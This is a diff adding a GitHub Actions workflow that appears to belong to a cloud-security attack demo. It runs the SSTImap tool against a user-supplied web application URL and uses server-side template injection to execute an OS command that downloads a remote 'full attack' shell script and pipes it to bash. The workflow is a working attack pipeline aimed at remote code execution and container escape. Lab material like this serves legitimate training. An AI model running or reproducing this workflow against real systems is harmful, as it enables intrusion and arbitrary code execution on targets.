@@ -1,0 +1,27 @@
+name: Attack_WebApp-Container-Escape
+
+on:
+  # push:
+  #  branches:
+  #    - main
+  workflow_dispatch:
+    inputs:
+      APP_URL:
+        description: 'URL of the web application to attack'
+        required: true
+        default: '<CHANGE ME>'
+
+
+jobs:
+    attack-job:
+        runs-on: ubuntu-latest
+          
+        steps:
+            - name: Checkout repository
+              uses: actions/checkout@v3
+
+            - name: Run Full Attack
+              run: |
+                docker run chrisley75/sstimap:1.0.3 \
+                  -u "${{ github.event.inputs.APP_URL }}page?name=attack" \
+                  --os-cmd "curl -s https://raw.githubusercontent.com/cloudsec-org/4-webapp-attack-demo/refs/heads/main/vul-app/scripts/cloudlabs-full-attack.sh | bash"
